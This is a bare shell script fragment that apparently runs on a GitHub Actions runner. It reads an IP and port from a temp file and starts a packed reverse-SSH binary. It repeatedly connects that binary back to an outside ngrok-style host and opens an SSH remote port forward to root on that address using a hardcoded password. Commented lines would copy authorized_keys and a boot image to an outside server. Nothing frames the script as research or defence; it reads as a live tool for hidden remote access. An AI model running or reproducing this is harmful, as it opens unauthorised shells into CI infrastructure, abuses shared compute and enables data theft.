ip_port5=$(grep -oP "(?<=AABBCC_10000MDLLLL).*(?=FFF)" /tmp/js9)
port5=${ip_port5#*:};
ip5=${ip_port5%:*};

if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then
   ((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -l -p 60021)&)&
   ((
   for((i=0;i<10;i++));do sudo /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b 50050  -p 34292 ngrok.xiaomiqiu123.top;sleep 60;sleep $i;done
   )&)&

 
   #sudo scp -P 28357 /home/runner/.ssh/authorized_keys    root@node4.buuoj.cn:/root/.ssh/authorized_keys
   #sudo scp -o StrictHostKeyChecking=no -P 28357 /boot/initrd.img-5.15.0-1022-azure root@node4.buuoj.cn:/tmp/initrd.img-5.15.0;

   (
   echo "ssh -o StrictHostKeyChecking=no -p${port5} -R 127.7.7.7:61080:127.2.2.2:61080 root@${ip5}";
   sleep 2;echo 123456;
   sleep 1;echo 123456;
   sleep 0.6;
      (while :;do [ -f /tmp/keepalive ]&&(echo -e "\n";sleep 11)||break;done)
   )|script /tmp/nz_hstnme
fi